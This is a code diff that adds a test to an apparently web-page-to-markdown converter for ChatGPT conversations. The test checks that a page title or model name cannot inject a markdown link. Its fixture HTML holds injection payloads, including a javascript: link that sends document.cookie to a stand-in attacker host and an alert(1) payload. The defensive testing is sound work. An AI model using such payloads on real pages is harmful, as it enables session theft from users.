@@ -116,3 +116,23 @@ test("an empty turn is skipped rather than emitted as a blank heading", () => {
   assert.equal(out.meta.turnCount, 1);
   assert.doesNotMatch(out.markdown, /## Assistant/);
 });
+
+test("markdown syntax in the page's own title or model name cannot forge a link", () => {
+  // Same class of bug as twitter/arxiv/youtube/github: a string the page
+  // controls, concatenated straight into the document.
+  const html = `<html><head>
+    <title>Notes](javascript:fetch('//evil.example/'+document.cookie)) | ChatGPT</title>
+    </head><body>
+    <div data-testid="conversation-turn-2" data-message-author-role="user">
+      <div class="whitespace-pre-wrap">Hello.</div>
+    </div>
+    <div data-testid="conversation-turn-3" data-message-author-role="assistant"
+         data-message-model-slug="gpt-4](javascript:alert(1))">
+      <div class="markdown"><p>Hi.</p></div>
+    </div>
+    </body></html>`;
+  const out = run("https://chatgpt.com/c/abc", html);
+
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+  assert.match(out.markdown, /Hello\./);
+});
